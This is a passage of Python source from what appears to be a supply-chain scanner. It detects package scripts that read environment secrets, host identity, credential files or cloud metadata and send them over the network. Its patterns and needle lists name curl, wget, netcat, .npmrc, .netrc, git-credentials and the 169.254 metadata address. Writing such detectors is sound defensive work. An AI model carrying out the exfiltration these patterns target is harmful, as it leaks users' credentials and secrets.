    r"\s*(?:async\s+)?(?:function\b\s*(?:\*\s*)?(?:[\w$]+\s*)?\(([^)\n]{0,300})\)|\(([^)\n]{0,300})\)\s*=>"
    r"|([A-Za-z_$][\w$]*)\s*=>)|\s*lambda\b([^:\n]{0,300}):")
# a value that is a function (its calls give what it returns; an arrow's or a
# lambda's expression is what it returns)
_LD_FUNC_VALUE_RE = re.compile(
    r"\s*(?:async\s+)?(?:function\b|\([^)\n]{0,300}\)\s*=>|[A-Za-z_$][\w$]*\s*=>)|\s*(?:lambda\b|class\b)")
_LD_ARROW_BODY_RE = re.compile(
    r"\s*(?:async\s+)?(?:\([^)\n]{0,300}\)|[A-Za-z_$][\w$]*)\s*=>\s*(?!\{)|\s*lambda\b[^:\n]{0,300}:")
_LD_CALLED_RE = re.compile(r"\s*\(")
# reads given a path (sealed: what they give is not their path's)
_LD_SEAL_RE = re.compile(
    r"\b(?:readFileSync|readFile|readdirSync|readdir|createReadStream|opendirSync|opendir|listdir|scandir|walk|glob"
    r"|iglob|open|existsSync|exists|statSync|lstatSync|isfile|isdir)\s*\(")
_LD_COLLECT_RE = re.compile(
    r"(?<![\w$.])([A-Za-z_$][\w$]*)(?:\s*\.\s*[A-Za-z_$][\w$]*){0,4}\s*\.\s*"
    r"(?:push|append|extend|add|update|unshift|insert|setdefault)\s*\(")
# a request, a socket or a connection assigned to a name: its write, end, send … is a send
_LD_CONNECTION_RE = re.compile(
    r"\b(?:https?|http2|net|tls|dgram)\s*\.\s*(?:get|createSocket)\s*\("
    r"""|\brequire\s*\(\s*["'](?:node:)?(?:https?|http2|net|tls|dgram)["']\s*\)\s*\.\s*"""
    r"(?:request|get|connect|createConnection|createSocket)\s*\("
    r"|(?<![\w$])[A-Za-z_$][\w$]*\s*\.\s*(?:request|connect|createConnection)\s*\("
    r"|\bnew\s+(?:net\s*\.\s*)?(?:Socket|XMLHttpRequest|WebSocket)\s*\("
    r"|\bsocket\s*\.\s*(?:socket|create_connection)\s*\(|\bHTTPS?Connection\s*\(")
# the environment a call is given as a keyword argument (`launch(cmd, env=e)`,
# `Popen(…, env=…)`): the program's that runs with it, not data
_LD_ENV_KWARG_RE = re.compile(r"(?<=[(,])\s*env\s*=(?![=>])\s*")
_LD_WRITE_TAIL = r"\s*\.\s*(?:write|end|send|sendall|sendto|request)\s*\("
_LD_BODY_RE = re.compile(r"\s*\{")
_LD_WRITE_TAIL_RE = re.compile(_LD_WRITE_TAIL)
# an address whose host name the script builds from a value (`'https://' + h +
# '.x.invalid'`, `https://${h}.x.invalid`): resolving it sends the value
_LD_HOST_BUILT_RE = re.compile(
    r"""[fFrRbBuU]{0,2}(["'`])(?:https?|wss?)://[^"'`/\s?#]{0,200}?"""
    r"""(?:\1\s*\+\s*([^\n+;,)]{1,200})|\$\{([^}\n]{1,200})\}|\{([^}\n]{1,200})\})""")
# sends: an address first (the environment does not count there), then data
_LD_SEND_RE = re.compile(
    r"\b(?:axios|got|needle|superagent|ky|requests|httpx|session|client|aiohttp)\s*\.\s*(?:post|put|patch)\s*\("
    r"|\bsendBeacon\s*\(|\bRequest\s*\(|\burlopen\s*\(|(?<![\w$.])fetch\s*\("
    r"|\b(?:globalThis|window|self|global)\s*\.\s*fetch\s*\(")
# sends given an options object, or a method and an address first; a command
# a script runs that sends
_LD_OPTIONS_SEND_RE = re.compile(r"\baxios\s*\(")
_LD_REQUEST_SEND_RE = re.compile(r"\b(?:requests|httpx|session|client)\s*\.\s*request\s*\(")
_LD_EXEC_SEND_RE = re.compile(
    r"\b(?:execSync|exec|spawnSync|spawn|execFileSync|execFile|system|popen|check_output|check_call|call|run"
    r"|Popen|getoutput)\s*\(")
_LD_NET_PROGRAM_RE = re.compile(r"""(?:["'`]|[;&|]\s*|\$\(\s*)(?:[\w./-]*/)?(?:curl|wget|nc|ncat|netcat|nslookup|dig"""
                                r"""|ping|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b""")
# requests whose arguments are an address, and lookups of a name (one
# written with a literal: a lookup of the machine's own name is none)
_LD_ADDRESS_SEND_RE = re.compile(
    r"\b(?:https?\s*\.\s*(?:get|request)|axios\s*\.\s*get|got|requests\s*\.\s*get|httpx\s*\.\s*get)\s*\("
    r"""|\brequire\s*\(\s*["'](?:node:)?https?["']\s*\)\s*\.\s*(?:get|request)\s*\(""")
_LD_LOOKUP_SEND_RE = re.compile(r"\b(?:dns\s*\.\s*(?:lookup|resolve\w*)|gethostbyname|getaddrinfo)\s*\(")
# a value composed with a literal: a sum, a format, a join or a template with
# one (`h + '.x.invalid'`, `'{}.x'.format(h)`, `f'{h}.x'`, `${h}.x`; not a
# call given one: `os.getenv('HOSTNAME')`)
_LD_COMPOSED_RE = re.compile(
    r"""["'`]\s*\+|\+\s*[fFrRbBuU]{0,2}["'`]|["']\s*%\s*[\w(]|["']\s*\.\s*(?:format|join)\s*\("""
    r"""|(?<![\w$])[fF][rRbB]?["']|`[^`\n]*\$\{|\.\s*concat\s*\(""")
# an HTTP client under the script's own name: a client module's
# (`const nf = require('node-fetch')`, `import request from 'request'`,
# `const { request } = require('undici')`) or an instance (`axios.create(…)`,
# `requests.Session()`, `with httpx.Client() as c:`): its calls, post, put
# and patch are sends with an address first; its request(method, address, …)
_LD_CLIENT_MODULES = (r"node-fetch|cross-fetch|isomorphic-fetch|isomorphic-unfetch|undici|axios|got|request|needle"
                      r"|superagent|phin|bent|ky|make-fetch-happen|minipass-fetch|ofetch|node-fetch-native|wretch")
_LD_CLIENT_RE = re.compile(
    r"""\brequire\s*\(\s*["'](?:""" + _LD_CLIENT_MODULES + r""")["']\s*\)(?!\s*(?:\.|\[|\?\.))"""
    r"""|(?:\b(?:axios|got|ky)|\brequire\s*\(\s*["'](?:axios|got|ky)["']\s*\))\s*\.\s*(?:create|extend)\s*\("""
    r"|\b(?:requests|httpx|urllib3|aiohttp)\s*\.\s*(?:Session|session|Client|AsyncClient|PoolManager|ClientSession)\s*\(")
_LD_CLIENT_IMPORT_RE = re.compile(
    r"""\bimport\s+(?:\*\s*as\s+)?([A-Za-z_$][\w$]*)\s*(?:,\s*\{[^{}\n]{0,300}\}\s*)?from\s*["'](?:"""
    + _LD_CLIENT_MODULES + r""")["']""")
_LD_CLIENT_AS_RE = re.compile(
    r"\b(?:requests|httpx|urllib3|aiohttp)\s*\.\s*(?:Session|session|Client|AsyncClient|PoolManager|ClientSession)"
    r"\s*\([^()\n]{0,300}\)\s*as\s+([A-Za-z_]\w*)")
_LD_CLIENT_SEND_TAIL = r")\s*(?:\.\s*(?:post|put|patch)\s*)?\("
_LD_CLIENT_REQUEST_TAIL = r")\s*\.\s*request\s*\("
_LD_NEEDLES = ("env", "hostname", "userInfo", "homedir", "networkInterfaces", "getuser", "getlogin", "uname", "exec",
               "ipify", "ip-api", "ipinfo", "ifconfig.me", "icanhazip", "checkip", "ipapi", "ident.me", "myip",
               "wtfismyip", "gethostname", "getfqdn", ".env", "npmrc", "pypirc", "netrc", "git-credentials",
               "check_output", "getoutput", "popen", "run", "read", "open", "listdir", "scandir", "walk", "glob",
               "169.254", "metadata", "Metadata", "100.100.100.200", "fd00:ec2", "platform", "create_subprocess")
_LD_SEND_NEEDLES = ("request", "fetch", "post", "put", "patch", "send", "write", "end(", "urlopen", "Request", "get",
                    "dns", "gethostbyname", "getaddrinfo", "connect", "Socket", "socket", "curl", "wget", "nc ",
                    "nslookup", "dig", "ping")
_LD_METADATA_NEEDLES = ("169.254", "metadata", "Metadata", "100.100.100.200", "fd00:ec2")
_LD_MAX = 200                    # sources, sends, functions and their calls examined per text
_LD_MAX_CALLS = 10000            # calls examined for a path outside the package
_LD_STATEMENT_SPAN = 2000        # characters of a statement's value read, over rows
_LD_LONG = 262144                # a text longer than this (a bundle, whose modules reuse names) …
_LD_NEAR = 20000                 # … follows a name only this many characters from where it was given data
_LD_BODY_SPAN = 20000            # characters of a function's body read for where it ends
_LD_REASONS = {
    "address": "sends the machine's public IP address over the network",
    "environment": "sends environment variables over the network",
    "file": "reads files outside the package and sends them over the network",
    "identity": "sends the machine's user or host name over the network",
    "report": "sends what local commands report about the machine over the network",
    "credentials": "sends what the cloud's instance metadata service gives it (the machine's credentials) over the network",
}
_LD_NOT_IN_ADDRESS = frozenset({"environment", "credentials", "address"})


def _ld_statement_end(text, i):
    """The end of the statement whose value starts at i: the first `;` or
    line break outside brackets and string literals, or a bracket that
    closes one opened before i (at most _LD_STATEMENT_SPAN characters on)."""
    depth, n = 0, min(len(text), i + _LD_STATEMENT_SPAN)
    while i < n:
        ch = text[i]
        if ch in "\"'`":
            if ch != "`" and text.startswith(ch * 3, i):
                j = text.find(ch * 3, i + 3)
                if j < 0 or j + 3 > n:
                    return n
                i = j + 3
                continue
            j = i + 1
            while j < n and text[j] != ch:
                j += 2 if text[j] == "\\" else 1
            if j >= n:
                return n
            i = j + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                return i
            depth -= 1
        elif depth == 0 and ch in ";\n":
            return i
        i += 1
    return n


def _ld_block_end(text, i):
    """The index of the '}' that closes the '{' at text[i] (string literals
    and comments skipped), or None when it is not closed within
    _LD_BODY_SPAN characters."""
    depth, n = 0, min(len(text), i + _LD_BODY_SPAN)
    while i < n:
        ch = text[i]
        if ch in "\"'`":
            j = i + 1
            while j < n and text[j] != ch:
                j += 2 if text[j] == "\\" else 1
            if j >= n:
                return None
            i = j + 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] in "/*":
            j = text.find("\n", i + 2, n) if text[i + 1] == "/" else text.find("*/", i + 2, n)
            if j < 0:
                return None
            i = j + (1 if text[i + 1] == "/" else 2)
            continue
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return None


def _ld_def_end(text, start, in_literal):
    """Where the body of the `def` at text[start] ends: the start of the first
    line after it indented no deeper than the `def` (not blank, a comment or
    in a string literal), len(text) at the text's end, or None when that is
    more than _LD_BODY_SPAN characters on."""
    line = text.rfind("\n", 0, start) + 1
    k = line
    while k < start and text[k] in " \t":
        k += 1
    indent, n = k - line, min(len(text), start + _LD_BODY_SPAN)
    pos = text.find("\n", start)
    while 0 <= pos < n:
        pos += 1
        k = pos
        while k < len(text) and text[k] in " \t":
            k += 1
        if k < len(text) and text[k] not in "\r\n#" and k - pos <= indent and not in_literal(k):
            return pos
        pos = text.find("\n", k)
    return len(text) if pos < 0 else None


def _ld_func_end(text, m, in_literal):
    """Where the body of the function _LD_FUNC_RE matched as `m` ends (its
    closing '}', the line after its block, the end of an arrow's
    expression), or None when that is not known."""
    if m.group(1) is not None:                      # def f(…): an indented block
        return _ld_def_end(text, m.start(), in_literal)
    if m.group(9) is not None:                      # a method: `f(…) {`
        return _ld_block_end(text, m.end() - 1)
    body = _LD_BODY_RE.match(text, m.end())
    if body is not None:
        return _ld_block_end(text, body.end() - 1)
    if m.group(7) is not None or m.group(8) is not None:     # an arrow's expression
        return _ld_statement_end(text, m.end())
    return None


def _ld_params(plist):
    """The names in a parameter list (not self, cls or a keyword)."""
    names = []
    for part in plist.split(","):
        p = _LD_PARAM_RE.match(part)
        if p is not None and p.group(1) not in ("self", "cls") and p.group(1) not in _LD_NOT_NAMES:
            names.append(p.group(1))
    return names


def _ld_then_params(args):
    """The names a callback's first parameter gives what it is called with
    (`args`: the callback's text): the parameter, or the names it
    destructures (`({ stdout }) =>`)."""
    d = _LD_DESTRUCT_PARAM_RE.match(args)
    if d is not None:
        names = (_DD_DESTRUCT_NAME_RE.search(part.strip()) for part in d.group(1).split(","))
        return [n.group(1) for n in names if n is not None and n.group(1) not in _LD_NOT_NAMES]
    p = _DD_PARAM_RE.match(args)
    return [p.group(1)] if p is not None and p.group(1) not in _LD_NOT_NAMES else []


def _ld_literal_test(text):
    """in_literal(pos) for `text`: is pos in a string literal? A template
    literal's or an f-string's text is code here (its holes are)."""
    spans = [(a, b) for a, b in _literal_spans(text)
             if text[a] != "`" and not (a > 0 and text[a - 1] in "fF")
             and not (a > 1 and text[a - 2] in "fF" and text[a - 1] in "rRbB")]
    starts = [a for a, _ in spans]

    def in_literal(pos):
        k = bisect.bisect_right(starts, pos) - 1
        return k >= 0 and pos < spans[k][1]
    return in_literal


def _ld_split_args(args):
    """[(start, end)] of a call's arguments in `args` (what follows its '('
    up to the bracket that closes it): split at commas outside brackets and
    string literals."""
    out, depth, start, i, n = [], 0, 0, 0, len(args)
    while i < n:
        ch = args[i]
        if ch in "\"'`":
            j = args.find(ch, i + 1)
            if j < 0:
                break
            i = j + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            out.append((start, i))
            start = i + 1
        i += 1
    out.append((start, n))
    return out


# a request's options: their values are an address, not data (a proxy, a
# token for a private download, the host): the environment does not count
_LD_OPTION_KEYS = frozenset({
    "headers", "agent", "httpsAgent", "httpAgent", "proxy", "proxies", "auth", "signal", "timeout", "method",
    "dispatcher", "cert", "key", "ca", "rejectUnauthorized", "verify", "credentials", "mode", "cache", "redirect",
    "allow_redirects", "follow_redirects", "stream", "keepalive", "integrity", "referrerPolicy", "responseType",
    "maxRedirects", "validateStatus", "url", "baseURL", "base_url", "hostname", "host", "port", "path", "protocol",
    "family", "localAddress", "lookup", "retry", "hooks", "https", "http2", "decompress", "followRedirect",
    "throwHttpErrors", "encoding", "trust_env", "timeout_ms"})
# a process's options (subprocess's keyword arguments)
_LD_PROCESS_KEYS = frozenset({
    "env", "cwd", "shell", "stdin", "stdout", "stderr", "capture_output", "text", "check", "close_fds",
    "creationflags", "startupinfo", "universal_newlines", "bufsize", "executable", "preexec_fn", "pass_fds",
    "start_new_session", "user", "group", "umask"})
_LD_KWARG_RE = re.compile(r"\s*([A-Za-z_]\w*)\s*=(?!=)")
_LD_KEY_RE = re.compile(r"""\s*(?:["']([^"'\n]{1,60})["']|([A-Za-z_$][\w$]*))\s*:(?!:)""")
# an object literal's method (`run(x) {`, `"path"(exports) {`, `async *[k]() {`): code, not data
_LD_METHOD_RE = re.compile(r"""\s*(?:(?:async|get|set|static)\s+)*\*?\s*(?:["'][^"'\n]{1,200}["']|(?!(?:if|for|while"""
                           r"""|switch|catch|function|with|return)(?![\w$]))[A-Za-z_$][\w$]*|\[[^\]\n]{1,200}\])"""
                           r"""\s*\([^)\n]{0,300}\)\s*\{""")
_LD_METHOD_IN_RE = re.compile(r"[{,]" + _LD_METHOD_RE.pattern)


def _ld_object_spans(text, lo, hi):
    """[(start, end, address)] for the values of the object literal whose
    '{' is at lo (an option's value is an address, see above)."""
    close = lo + 1 + len(_call_args(text[lo + 1:hi]))
    out = []
    for a, b in _ld_split_args(text[lo + 1:close]):
        part = text[lo + 1 + a:lo + 1 + b]
        if _LD_METHOD_RE.match(part) is not None:
            continue                                # a method: code, not data
        key = _LD_KEY_RE.match(part)
        if key is not None:
            if _LD_FUNC_VALUE_RE.match(part, key.end()) is not None:
                continue                            # a function (a callback): code, not data
            out.append((lo + 1 + a + key.end(), lo + 1 + b, (key.group(1) or key.group(2)) in _LD_OPTION_KEYS))
        else:
            out.append((lo + 1 + a, lo + 1 + b, part.strip() in _LD_OPTION_KEYS))
    return out


def _ld_value_spans(text, lo, hi):
    """[(start, end, address)] for a value: an object literal's values, else
    the value whole but the bodies of the methods of the object literals in
    it (`wrap({ "x.js"(exports) { … } })`: a bundle's module, code)."""
    stripped = text[lo:hi].lstrip()
    if stripped.startswith("{"):
        return _ld_object_spans(text, hi - len(stripped), hi)
    out, pos = [], lo
    for m in _LD_METHOD_IN_RE.finditer(text, lo, hi):
        if m.start() < pos:
            continue
        body = m.end() + len(_call_args(text[m.end():hi])) + 1     # (after the '}' that closes it)
        out.append((pos, m.end(), False))
        pos = min(body, hi)
    out.append((pos, hi, False))
    return out


def _ld_arg_spans(text, lo, hi, addresses=0, process=False):
    """[(start, end, address)] for a call's arguments text[lo:hi]: the first
    `addresses` are addresses, a keyword argument's or an object literal's
    value is an address when it is an option (see above). `process`: the
    call starts a program — its options object, and its keyword arguments
    that are a process's options (env=, cwd= …), are not data sent."""
    out = []
    for k, (a, b) in enumerate(_ld_split_args(text[lo:hi])):
        a, b = lo + a, lo + b
        if _LD_FUNC_VALUE_RE.match(text, a, b) is not None:
            continue                                # a callback: code run later, not data sent
        if k < addresses:
            out.append((a, b, True))
            continue
        kw = _LD_KWARG_RE.match(text, a, b)
        if kw is not None:
            out.append((kw.end(), b, kw.group(1) in _LD_OPTION_KEYS or process and kw.group(1) in _LD_PROCESS_KEYS))
        elif process and text[a:b].lstrip().startswith("{"):
            out.append((a, b, True))
        else:
            out.extend(_ld_value_spans(text, a, b))
    return out


def _ld_process_options(text, lo, hi):
    """[(start, end)] of the values of a process's options (env, cwd …: a
    keyword argument, or a key of an object literal) in a call's arguments
    text[lo:hi]."""
    out = []
    for a, b in _ld_split_args(text[lo:hi]):
        a, b = lo + a, lo + b
        kw = _LD_KWARG_RE.match(text, a, b)
        if kw is not None:
            if kw.group(1) in _LD_PROCESS_KEYS:
                out.append((kw.end(), b))
            continue
        stripped = text[a:b].lstrip()
        if stripped.startswith("{"):
            start = b - len(stripped)
            close = start + 1 + len(_call_args(text[start + 1:b]))
            for c, d in _ld_split_args(text[start + 1:close]):
                key = _LD_KEY_RE.match(text, start + 1 + c, start + 1 + d)
                if key is not None and (key.group(1) or key.group(2)) in _LD_PROCESS_KEYS:
                    out.append((key.end(), start + 1 + d))
    return out


def _ld_bound(text, at, args, names):
    """[(parameter, start, end)]: the arguments `args` (a call's, at `at`)
    give a function whose parameters are `names`: by position, or by the
    keyword that names one (`send(url, data=d)`)."""
    out = []
    for k, (a, b) in enumerate(_ld_split_args(args)):
        a, b = at + a, at + b
        kw = _LD_KWARG_RE.match(text, a, b)
        if kw is not None and kw.group(1) in names:
            out.append((kw.group(1), kw.end(), b))
        elif k < len(names):
            out.append((names[k], a, b))
    return out


def _ld_word_before(text, i):
    """The index of the first character of the run of spaces before text[i]'s
    (i itself when there is none)."""
    while i > 0 and text[i - 1] in " \t\n":
        i -= 1
    return i


def _ld_ident_char(c):
    return c.isascii() and (c.isalnum() or c in "_$")


def _ld_tested(text, start, end):
    """Is the value text[start:end] tested rather than used (see above)?"""
    if _LD_TEST_AFTER_RE.match(text, end) is not None:
        return True
    j = _ld_word_before(text, start)
    if j > 0 and text[j - 1] == "!":
        return True
    for word in _LD_TEST_BEFORE:
        k = j - len(word)
        if k >= 0 and text.startswith(word, k) and (k == 0 or not _ld_ident_char(text[k - 1])):
            return True
    return False


def _ld_defined(text, start, end):
    """Is the call text[start:end] (to its ')') a function's definition — `def
    f(…)`, `function f(…)`, a method's `f(…) {`?"""
    if text.startswith(")", end) and _LD_BODY_RE.match(text, end + 1) is not None:
        return True
    j = _ld_word_before(text, start)
    for word in ("def", "function"):
        k = j - len(word)
        if k >= 0 and text.startswith(word, k) and (k == 0 or not _ld_ident_char(text[k - 1])):
            return True
    return False


def _ld_names_in(text, lo, hi, names, in_literal):
    """The first name of `names` used in text[lo:hi] (not in a literal), else None."""
    for m in _LD_NAME_TOKEN_RE.finditer(text, lo, hi):
        if m.group() in names and not in_literal(m.start()):
            return m.group()
    return None


def _ld_outside(text, lo, hi, reader, outside, in_literal):
    """Does text[lo:hi], a call's first argument, name a path outside the
    package (see above)? `reader`: the call reads or lists what it names;
    `outside`: the names that hold such a path."""
    first = text[lo:hi]
    if _LD_OWN_FOLDER_RE.search(first) is not None:
        return False
    if _LD_FS_ROOT_RE.match(first) is not None or first.strip() in outside:
        return True
    if reader and (_LD_ABSOLUTE_RE.match(first) is not None or _LD_HOME_RE.search(first) is not None
                   or _LD_ABSOLUTE_IN_RE.search(first) is not None or _LD_CRED_FILE_RE.match(first) is not None):
        return True
    # (a name that holds one, in a path built on it: not a callback's code that uses it)
    return bool(outside) and _LD_PATH_EXPR_RE.match(first) is not None \
        and _ld_names_in(text, lo, hi, outside, in_literal) is not None


def _ld_sources(text, in_literal, outside, own):
    """[(offset, end, open, kind, what)]: where `text` reads local data (see
    above); `open` is the index after a read's '(' (for its callback), else -1.
    `own`: the names of the script's own functions (a path a name holds
    counts in a read, or in a call of one of them: not in a method's call)."""
    out = []
    for k, m in enumerate(_LD_ENV_RE.finditer(text)):
        if k >= _LD_MAX:
            break
        if in_literal(m.start()):
            continue
        name = next((g for g in m.groups() if g is not None), None)
        end = m.end()
        if m.group(4) is not None or m.group(5) is not None:        # a call's value: after the call
            end += len(_call_args(text[end:end + _DD_ARG_SPAN])) + 1
        if name is None or _ld_tested(text, m.start(), end):
            continue
        if _SH_IDENTITY_VAR_RE.match(name):
            out.append((m.start(), m.end(), -1, "identity", name))
        elif _SH_SECRET_VAR_RE.search(name) is not None and not _LD_ENV_QUIET_RE.match(name):
            out.append((m.start(), m.end(), -1, "environment", name))
    for k, m in enumerate(_LD_ENV_ALL_RE.finditer(text)):
        if k >= _LD_MAX:
            break
        if in_literal(m.start()) or _ld_tested(text, m.start(), m.end()):
            continue
        s = _LD_ENV_SELECT_RE.match(text, m.end())
        if s is not None:
            cond = _call_args(text[s.end():s.end() + _DD_ARG_SPAN])
            if _LD_EXCLUDES_RE.search(cond) is None and _SH_SECRET_VAR_RE.search(cond) is None:
                continue
        out.append((m.start(), m.end(), -1, "environment", _LD_WHOLE_ENV))
    for k, m in enumerate(_LD_IDENTITY_RE.finditer(text)):
        if k >= _LD_MAX:
            break
        if not in_literal(m.start()):
            kind = "report" if m.group(1) in ("homedir", "networkInterfaces") else "identity"
            called = m.group(2) is not None or m.group(3) is not None
            out.append((m.start(), m.end(), m.end() if called else -1, kind, m.group(1) or "user or host name"))
    imported = {}                   # local name -> (kind, the module's name for it)
    if "os" in text:
        for pattern, module in ((_LD_IMPORT_JS_RE, None), (_LD_IMPORT_PY_RE, "")):
            for k, m in enumerate(pattern.finditer(text)):
                if k >= _LD_MAX:
                    break
                mod, names = ("os", m.group(1) or m.group(2)) if module is None else (m.group(1), m.group(2))
                for part in names.split(","):
                    n = _LD_IMPORT_NAME_RE.match(part)
                    if n is not None and n.group(1) in _LD_MODULE_NAMES[mod]:
                        imported.setdefault(n.group(2) or n.group(1), (_LD_MODULE_NAMES[mod][n.group(1)], n.group(1)))
    if imported:
        uses = re.compile(_DV_NAME_HEAD + "(" + "|".join(re.escape(n) for n in sorted(imported)) + r")\b(\s*\()?")
        for k, m in enumerate(uses.finditer(text)):
            if k >= _LD_MAX:
                break
            if not in_literal(m.start()):
                kind, what = imported[m.group(1)]
                out.append((m.start(), m.end(), m.end() if m.group(2) else -1, kind,
                            what if kind == "report" else "user or host name"))
    aliases = {}                    # local name -> the machine's module it names
    for k, m in enumerate(_LD_ALIAS_JS_RE.finditer(text) if "os'" in text or 'os"' in text else ()):
        if k >= _LD_MAX:
            break
        name = m.group(1) or m.group(2)
        if name != "os" and not in_literal(m.start()):
            aliases.setdefault(name, "os")
    for k, m in enumerate(_LD_ALIAS_PY_RE.finditer(text) if " as " in text else ()):
        if k >= _LD_MAX:
            break
        if in_literal(m.start()):
            continue
        for part in m.group(1).split(","):
            a = _LD_ALIAS_PY_PART_RE.match(part)
            if a is not None and a.group(2) != a.group(1):
                aliases.setdefault(a.group(2), a.group(1))
    if aliases:
        uses = re.compile(_DV_NAME_HEAD + "(" + "|".join(re.escape(n) for n in sorted(aliases)) + _LD_ALIAS_TAIL)
        for k, m in enumerate(uses.finditer(text)):
            if k >= _LD_MAX:
                break
            module = aliases[m.group(1)]
            kind = _LD_MODULE_NAMES[module].get(m.group(2))
            if kind is not None and not in_literal(m.start()):
                what = m.group(2) if module == "os" and m.group(2) in _LD_OS_NAMED else "user or host name"
                out.append((m.start(), m.end(), m.end() if m.group(3) else -1, kind, what))
    if _LD_READS_RE.search(text) is not None:
        for k, m in enumerate(_LD_CALL_RE.finditer(text)):
            if k >= _LD_MAX_CALLS or len(out) >= _LD_MAX * 3:
                break
            name = m.group(1)
            if name in _LD_NOT_READS or in_literal(m.start()):
                continue
            reader = name in _LD_READERS
            names = outside if reader or (m.start(1) == m.start() and name in own) else ()
            if not reader and not names and _LD_FS_ROOT_RE.match(text, m.end()) is None:
                continue
            args = _call_args(text[m.end():m.end() + _DD_ARG_SPAN])
            first = _call_first_arg(args)
            lead = len(args) - len(args.lstrip())
            if _ld_outside(text, m.end() + lead, m.end() + lead + len(first), reader, names, in_literal):
                plain = _LD_PLAIN_LITERAL_RE.match(first)
                what = plain.group(2) if plain is not None else first
                out.append((m.start(), m.end() + len(args), m.end(), "file",
                            (what if reader else f"{name}({first})")[:60]))
    runners = [_LD_EXEC_RE]         # (and a runner under the script's own name: `util.promisify(exec)`)
    if "promisify" in text:
        names = sorted({m.group(1) for _, m in zip(range(_LD_MAX), _LD_PROMISIFY_RE.finditer(text))
                        if not in_literal(m.start())})
        if names:
            runners.append(re.compile(_DV_NAME_HEAD + "(?:" + "|".join(re.escape(n) for n in names) + ")"
                                      + _LD_EXEC_TAIL))
    for runner in runners:
        for k, m in enumerate(runner.finditer(text)):
            if k >= _LD_MAX:
                break
            if in_literal(m.start()):
                continue
            argv = [m.group(2)] + _LD_ARGV_ITEM_RE.findall(m.group(3))
            for kind, what in _sh_output_data(" ".join(argv), 0):
                out.append((m.start(), m.end(), m.end(1), kind, what))
                break
    metadata = any(nd in text for nd in _LD_METADATA_NEEDLES)
    if metadata or _LD_PUBLIC_IP_RE.search(text) is not None:
        for k, f in enumerate(_DD_FETCH_RE.finditer(text)):
            if k >= _LD_MAX:
                break
            if in_literal(f.start()):
                continue
            args = _call_args(text[f.end():f.end() + _DD_ARG_SPAN])
            if metadata and _LD_METADATA_RE.search(args) is not None:
                out.append((f.start(), f.end() + len(args), f.end(), "credentials", "the instance's metadata"))
            elif _LD_PUBLIC_IP_RE.search(args) is not None:
                out.append((f.start(), f.end() + len(args), f.end(), "address", "the machine's public IP address"))
    return out


_LD_MEMO = (None, None)          # (text, answer): the install-script and import-time tests read a text alike


def local_data_sent_at(text):
    """(offset, kind, what, in_address) of the first send of data `text` reads
    from the machine (see above), else None. `in_address`: no send's data
    holds it, but a request's address holds a variable of the environment,
    the instance's metadata or the public IP address (a download's address
    may hold a token: it counts where the address is a capture service's)."""
    global _LD_MEMO
    memo = _LD_MEMO
    if memo[0] is text:
        return memo[1]
    answer = _local_data_sent_at(text)
    _LD_MEMO = (text, answer)
    return answer


def _ld_key(text, name, end):
    """The name data is followed in for `name` (ending at text[end]): the
    name itself; a receiver's member (`this.x`, see _LD_RECEIVERS); or None
    (a keyword, a module's exports or the runtime's objects, a receiver's
    computed member)."""
    if name in _LD_NOT_NAMES or name in _LD_NOT_RECEIVERS:
        return None
    if name not in _LD_RECEIVERS:
        return name
    m = _LD_FIRST_MEMBER_RE.match(text, end)
    if m is None:
        return None
    return name + "." + (m.group(1) or m.group(2))


def _local_data_sent_at(text):
    if not any(nd in text for nd in _LD_SEND_NEEDLES) or not any(nd in text for nd in _LD_NEEDLES):
        return None
    in_literal = _ld_literal_test(text)
    assigns = []                                    # (name, start, end) of what is assigned
    arrows = []                                     # (name, start, end) of what an arrow or a lambda returns
    for k, m in enumerate(_DD_ASSIGN_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        if not in_literal(m.start(1)) and m.group(1) not in _LD_NOT_NAMES:
            end = _ld_statement_end(text, m.start(2))
            if _LD_FUNC_VALUE_RE.match(text, m.start(2), end) is None:
                assigns.append((m.group(1), m.start(2), end))
            else:
                body = _LD_ARROW_BODY_RE.match(text, m.start(2), end)
                if body is not None:
                    arrows.append((m.group(1), body.end(), end))
    for pattern in (_DD_DESTRUCT_RE, _LD_DESTRUCT_ARRAY_RE):    # `{a, b: c} = …`, `[a, , b] = …`
        for k, m in enumerate(pattern.finditer(text)):
            if k >= _DD_MAX_ASSIGNS:
                break
            if in_literal(m.start()):
                continue
            end = _ld_statement_end(text, m.start(2))
            items = None                            # `[a, b] = [x, y]`: a is x, b is y
            if pattern is _LD_DESTRUCT_ARRAY_RE:
                value = text[m.start(2):end]
                if value.lstrip().startswith("["):
                    at = m.start(2) + len(value) - len(value.lstrip()) + 1
                    inner = _call_args(text[at:end])
                    items = [(at + a, at + b) for a, b in _ld_split_args(inner)]
            for n, part in enumerate(m.group(1).split(",")):
                name = _DD_DESTRUCT_NAME_RE.search(part.strip())
                if name is None or name.group(1) in _LD_NOT_NAMES:
                    continue
                if items is None:
                    assigns.append((name.group(1), m.start(2), end))
                elif n < len(items) and not part.strip().startswith("..."):
                    assigns.append((name.group(1), items[n][0], items[n][1]))
                elif part.strip().startswith("..."):
                    assigns.append((name.group(1), items[n][0] if n < len(items) else end, end))
    for k, m in enumerate(_LD_TUPLE_ASSIGN_RE.finditer(text) if "," in text else ()):
        if k >= _DD_MAX_ASSIGNS:                    # `out, err = p.communicate()`, `user, host = a, b`
            break
        if in_literal(m.start(1)):
            continue
        end = _ld_statement_end(text, m.start(2))
        names = [x.strip() for x in m.group(1).split(",")]
        items = [(m.start(2) + a, m.start(2) + b) for a, b in _ld_split_args(text[m.start(2):end])]
        for n, name in enumerate(names):
            if name not in _LD_NOT_NAMES:
                assigns.append((name,) + (items[n] if len(items) == len(names) else (m.start(2), end)))
    plain = len(assigns)                            # (the assignments of a name itself)
    options = []                                    # the values given a request's option (`opts.headers = …`)
    for k, m in enumerate(_LD_MEMBER_ASSIGN_RE.finditer(text)):
        if k >= _DD_MAX_ASSIGNS:
            break
        if in_literal(m.start(1)):
            continue
        name = _ld_key(text, m.group(1), m.end(1))
        if name is None:
            continue
        end = _ld_statement_end(text, m.end())
        if _LD_FUNC_VALUE_RE.match(text, m.end(), end) is not None:
            continue                                # (a method: what it returns is its own)
